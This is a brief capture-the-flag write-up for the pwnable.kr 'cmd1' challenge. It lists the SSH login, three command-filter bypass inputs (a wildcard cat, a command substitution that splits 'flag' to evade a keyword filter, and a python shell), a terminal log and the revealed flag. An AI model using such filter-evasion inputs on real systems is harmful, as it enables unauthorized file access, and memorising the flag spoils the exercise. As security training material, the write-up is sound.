# Source

Mommy! what is PATH environment in Linux?

ssh cmd1@pwnable.kr -p2222 (pw:guest)

[code](./cmd1.c)

# 🚩Solve

- W1: __./cmd1 "/bin/cat *"__
- W2: __./cmd1 '$(echo "/bin/cat fl""ag")'__
- W3: __./cmd1 "/bin/python"__
- ...

```bash
cmd1@pwnable:~$ ./cmd1 '$(echo "/bin/cat fl""ag")'
mommy now I get what PATH environment is for :)
cmd1@pwnable:~$
```

Flag: ___mommy now I get what PATH environment is for :\)___